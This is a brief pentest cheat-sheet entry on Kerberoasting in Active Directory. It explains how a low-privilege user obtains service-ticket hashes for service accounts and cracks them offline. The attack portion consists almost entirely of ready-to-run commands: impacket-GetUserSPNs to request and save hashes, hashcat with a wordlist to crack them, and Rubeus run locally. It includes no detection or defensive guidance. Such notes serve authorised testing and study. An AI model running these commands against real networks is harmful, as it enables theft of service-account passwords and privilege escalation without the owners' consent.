# Kerberoasting

Targets service accounts in an Active Directory environment as an authenticated (but low privilege) user. This is done by requesting a service ticket from the TGS which is encrypted with the SPN's password hash. We can then crack the hash offline.

SPN format:

```bash
# Format
<service class>/<host>:<port>

# Examples
HTTP/web04.corp.com:80
```

Perform remotely with [GetUserSPNs](../../14%20Impacket%20Tools/GetUserSPNs.md)

```bash
impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

Perform locally with [Rubeus](../0%20Tools/Local/Rubeus.md)

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
